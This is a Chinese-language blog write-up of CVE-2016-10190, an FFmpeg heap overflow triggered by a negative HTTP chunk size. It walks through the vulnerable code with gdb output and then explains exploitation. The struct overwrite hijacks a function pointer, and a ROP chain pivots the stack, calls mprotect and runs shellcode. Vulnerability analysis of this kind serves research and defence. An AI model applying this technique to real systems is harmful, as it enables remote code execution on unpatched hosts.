<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>CVE-2016-10190 FFmpeg Heap Overflow | Hello</title>
    <meta name="description" content="1">
    
    
    <link rel="preload" href="/assets/css/0.styles.153793e6.css" as="style"><link rel="preload" href="/assets/js/app.fb63a1b9.js" as="script"><link rel="preload" href="/assets/js/4.dc8e7db2.js" as="script"><link rel="prefetch" href="/assets/js/10.6aae25a8.js"><link rel="prefetch" href="/assets/js/11.e5a6ecb1.js"><link rel="prefetch" href="/assets/js/12.e6734d6c.js"><link rel="prefetch" href="/assets/js/13.c45be31f.js"><link rel="prefetch" href="/assets/js/14.7fe2edb8.js"><link rel="prefetch" href="/assets/js/15.7d96271b.js"><link rel="prefetch" href="/assets/js/16.d5c5556b.js"><link rel="prefetch" href="/assets/js/17.1a634ded.js"><link rel="prefetch" href="/assets/js/18.e6787f4e.js"><link rel="prefetch" href="/assets/js/19.a31276f8.js"><link rel="prefetch" href="/assets/js/2.6cf84733.js"><link rel="prefetch" href="/assets/js/20.f1ebd130.js"><link rel="prefetch" href="/assets/js/21.9fd25a7d.js"><link rel="prefetch" href="/assets/js/22.7ec64c15.js"><link rel="prefetch" href="/assets/js/23.a0a7d0ea.js"><link rel="prefetch" href="/assets/js/24.c17f3010.js"><link rel="prefetch" href="/assets/js/25.9bbf45e5.js"><link rel="prefetch" href="/assets/js/26.4f930016.js"><link rel="prefetch" href="/assets/js/27.b6d66343.js"><link rel="prefetch" href="/assets/js/28.ded43c8f.js"><link rel="prefetch" href="/assets/js/29.35b25580.js"><link rel="prefetch" href="/assets/js/3.88ebc755.js"><link rel="prefetch" href="/assets/js/30.a0b7fe3b.js"><link rel="prefetch" href="/assets/js/31.89d75be7.js"><link rel="prefetch" href="/assets/js/32.d7c054e6.js"><link rel="prefetch" href="/assets/js/33.9a5f3e99.js"><link rel="prefetch" href="/assets/js/34.ee5cfb6f.js"><link rel="prefetch" href="/assets/js/35.2054ab64.js"><link rel="prefetch" href="/assets/js/36.73bb48c1.js"><link rel="prefetch" href="/assets/js/37.5a1d6d20.js"><link rel="prefetch" href="/assets/js/38.c7d42097.js"><link rel="prefetch" href="/assets/js/39.fd864930.js"><link rel="prefetch" href="/assets/js/40.6c289e11.js"><link rel="prefetch" href="/assets/js/41.0ed23031.js"><link rel="prefetch" href="/assets/js/42.10b887da.js"><link rel="prefetch" href="/assets/js/43.d348e521.js"><link rel="prefetch" href="/assets/js/44.f98660b8.js"><link rel="prefetch" href="/assets/js/45.a141b3d0.js"><link rel="prefetch" href="/assets/js/46.3a3b1b86.js"><link rel="prefetch" href="/assets/js/47.d2f1996d.js"><link rel="prefetch" href="/assets/js/48.0bd12b2f.js"><link rel="prefetch" href="/assets/js/5.6adfd92b.js"><link rel="prefetch" href="/assets/js/6.f9bcea16.js"><link rel="prefetch" href="/assets/js/7.ad2cffde.js"><link rel="prefetch" href="/assets/js/8.8932bce4.js"><link rel="prefetch" href="/assets/js/9.892cc635.js">
    <link rel="stylesheet" href="/assets/css/0.styles.153793e6.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="page-main"><div class="component-nav-menu"><div class="placeholder"></div> <div class="search-wrapper"><div aria-haspopup="listbox" role="combobox" aria-owns="el-autocomplete-504" class="el-autocomplete"><div class="el-input el-input--prefix"><!----><input type="text" autocomplete="off" valueKey="title" placeholder="请输入内容" fetchSuggestions="function () { [native code] }" triggerOnFocus="true" debounce="300" placement="bottom-start" popperAppendToBody="true" background-color="#eee" class="el-input__inner"><span class="el-input__prefix"><i class="el-input__icon el-icon-search"></i></span><!----><!----><!----></div><div role="region" class="el-autocomplete-suggestion el-popper" style="width:;display:none;"><div class="el-scrollbar"><div class="el-autocomplete-suggestion__wrap el-scrollbar__wrap el-scrollbar__wrap--hidden-default"><ul class="el-scrollbar__view el-autocomplete-suggestion__list"></ul></div><div class="el-scrollbar__bar is-horizontal"><div class="el-scrollbar__thumb" style="width:0;transform:translateX(0%);ms-transform:translateX(0%);webkit-transform:translateX(0%);"></div></div><div class="el-scrollbar__bar is-vertical"><div class="el-scrollbar__thumb" style="height:0;transform:translateY(0%);ms-transform:translateY(0%);webkit-transform:translateY(0%);"></div></div></div></div></div></div> <ul role="menubar" class="el-menu--horizontal el-menu" style="background-color:;"><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
        Home
      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
        Blog
      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
        TimeLine
      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
        Github
      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
        About
      </li></ul></div> <div class="page-container"><div class="component-page"><div class="page-content"><!----> <div class="content custom"><h1 id="_0x1-漏洞分析"><a href="#_0x1-漏洞分析" aria-hidden="true" class="header-anchor">#</a> 0x1 漏洞分析</h1> <p>size是一个负数的时候，在recv函数出现堆溢出。
在http_read_stream函数中，当s-&gt;chunksize=-1， size = -1。</p> <table><thead><tr><th>tcp_read &lt;-</th> <th>retry_transfer_wrapper &lt;-</th> <th>ffurl_read &lt;-</th> <th>http_buf_read &lt;-</th> <th>http_read_stream</th></tr></thead> <tbody><tr><td>recv(s-&gt;fd, buf, size, 0);</td> <td>transfer_func(h, buf + len, size - len);</td> <td>retry_transfer_wrapper(h, buf, size, 1, h-&gt;prot-&gt;url_read);</td> <td>ffurl_read(s-&gt;hd, buf, size);</td> <td>s-&gt;chunksize = strtoll(line, NULL, 16);<br> size = FFMIN(size, s-&gt;chunksize);<br>read_ret = http_buf_read(h, buf, size);</td></tr> <tr><td>gdb-peda# p size <br> size = 0xffffffff  <br> gdb-peda# p buf <br>buf = 0x1e75080</td> <td>gdb-peda# p len	<br>  len = 0x0  <br>gdb-peda# p size<br>	size = 0xffffffff <br> gdb-peda# p buf <br>buf = 0x1e75080</td> <td>gdb-peda# p size <br>  size = 0xffffffff	<br> gdb-peda# p buf <br>buf = 0x1e75080</td> <td>gdb-peda# p size   <br>  size = 0xffffffff    <br> gdb-peda# p buf <br>buf = 0x1e75080</td> <td>s-&gt;chunksize = -1    <br>   size = -1</td></tr></tbody></table> <p>http_read_stream :</p> <div class="language- extra-class"><pre class="language-text"><code>....
....


if (s-&gt;end_chunked_post &amp;&amp; !s-&gt;end_header) {
	err = http_read_header(h, &amp;new_location);
	if (err &lt; 0)
	return err;
}

....
....

....
....

if (s-&gt;chunksize &gt;= 0){
	if (!s-&gt;chunksize) {
            char line[32];
	    do {
        	if ((err = http_get_line(s, line, sizeof(line))) &lt; 0) 
                	return err; 
            } while (!*line); 
	    s-&gt;chunksize = strtoll(line, NULL, 16);
            ....
	    ....
	}	
	size = FFMIN(size, s-&gt;chunksize);
}

....
....
</code></pre></div><p>请求头中包含Transfer-Encoding: chunked时，执行到s-&gt;chunksize = strtoll(line, NULL, 16);。
Transfer-Encoding: chunked 编码块值为-1的时，s-&gt;chunksize=-1</p> <table><thead><tr><th>http_read_header</th> <th>process_line</th> <th>http_read_stream</th></tr></thead> <tbody><tr><td></td> <td>if (!av_strcasecmp(tag, &quot;Transfer-Encoding&quot;) &amp;&amp;av_strncasecmp(p, &quot;chunked&quot;, 7))   <br>    s-&gt;filesize  = -1;   <br>  s-&gt;chunksize = 0;  <br></td> <td>s-&gt;chunksize = 0</td></tr> <tr><td></td> <td></td> <td>err = http_get_line(s, line, sizeof(line))</td></tr> <tr><td></td> <td></td> <td>gdb-peda$ x /s line <br>  0x7fffffffd1c0:	&quot;-1&quot;</td></tr></tbody></table> <p>变量buffer之后一段长度存在AVIOContext变量，覆盖AVIOContext中的函数指针变量，等下一次调用时控制eip</p> <table><thead><tr><th>ffio_fdopen</th> <th>-&gt; avio_alloc_context</th> <th>-&gt; ffio_init_context</th></tr></thead> <tbody><tr><td>buffer = av_malloc(buffer_size);  <br>   gdb-peda p buffer <br>  buffer = (uint8_t *) 0x1e75080</td> <td>AVIOContext *s = av_mallocz(sizeof(AVIOContext));  <br> gdb-peda$ p s   <br>  s = (AVIOContext *) 0x1e7d0e0</td> <td>s-&gt;buffer      = buffer; <br>  s-&gt;buffer_size = buffer_size; <br>s-&gt;opaque      = opaque;  <br>s-&gt;direct      = 0;   <br> s-&gt;buf_ptr     = buffer;</td></tr></tbody></table> <p>#　0x2 漏洞利用</p> <p>AVIOContext 结构体</p> <div class="language- extra-class"><pre class="language-text"><code>$1 = {
  av_class = 0x4242424242424242, 
  buffer = 0x4242424242424242 &lt;error: Cannot access memory at address 0x4242424242424242&gt;, 
  buffer_size = 0x42424242, 
  buf_ptr = 0x1e75080 'C' &lt;repeats 200 times&gt;..., 
  buf_end = 0x1e7d238 &quot;&quot;, 
  opaque = 0x4242424242424242, 
  read_packet = 0x6161616161616161, 
  write_packet = 0x4242424242424242, 
  seek = 0x4242424242424242, 
  pos = 0x424242424242c3fa, 
  must_flush = 0x42424242, 
  eof_reached = 0x0, 
  write_flag = 0x61616161, 
  max_packet_size = 0x61616161, 
  checksum = 0x6161616161616161, 
  checksum_ptr = 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;, 
  update_checksum = 0x6161616161616161, 
  error = 0x61616161, 
  read_pause = 0x6161616161616161, 
  read_seek = 0x6161616161616161, 
  seekable = 0x61616161, 
  maxsize = 0x6161616161616161, 
  direct = 0x61616161, 
  bytes_read = 0x616161616161e319, 
  seek_count = 0x61616161, 
  writeout_count = 0x61616161, 
  orig_buffer_size = 0x61616161, 
  short_seek_threshold = 0x61616161, 
  protocol_whitelist = 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;, 
  protocol_blacklist = 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;, 
  write_data_type = 0x6161616161616161, 
  ignore_boundary_point = 0x61616161, 
  current_type = 1633771873, 
  last_time = 0x6161616161616161
}

</code></pre></div><p>需要绕过下面的判断，才能调用read_packet函数。</p> <div class="language- extra-class"><pre class="language-text"><code>...
...
if (s-&gt;eof_reached)
    return
...
...
if (s-&gt;read_packet &amp;&amp; s-&gt;orig_buffer_size &amp;&amp; s-&gt;buffer_size &gt; s-&gt;orig_buffer_size) {
    ...
    av_assert0(len &gt;= s-&gt;orig_buffer_size);
}
...
...
len = s-&gt;read_packet(s-&gt;opaque, dst, len);
</code></pre></div><p><img src="/assets/img/call_rax.d7ca485d.png" alt="avatar"></p> <p>利用可控的寄存器，把栈迁移到堆上</p> <div class="language- extra-class"><pre class="language-text"><code>call   rax;      &gt;&gt;&gt;&gt;&gt;       push   rbx;  jmp    rdi;       &gt;&gt;&gt;&gt;&gt;      pop    rsp; ret;
</code></pre></div><p><img src="/assets/img/pop_rsp.3523a9e5.png" alt="avatar"></p> <p>利用add rsp, 0x58 调到连续可控的堆区域
<img src="/assets/img/continue.fcc1da0e.png" alt="avatar"></p> <p>调用mprotect 设置0x00400000内存的权限
<img src="/assets/img/mprotect.d7c002c5.png" alt="avatar"></p> <p>利用 mov qword ptr [rcx], rax ; ret 把shellcode复制到0x00400000
<img src="/assets/img/mov.49c7fc42.png" alt="avatar"></p> <p>最后执行shellcode
<img src="/assets/img/shellcode.8f5f5a82.png" alt="avatar"></p></div></div></div></div></div></div>
    <script src="/assets/js/app.fb63a1b9.js" defer></script><script src="/assets/js/4.dc8e7db2.js" defer></script>
  </body>
</html>
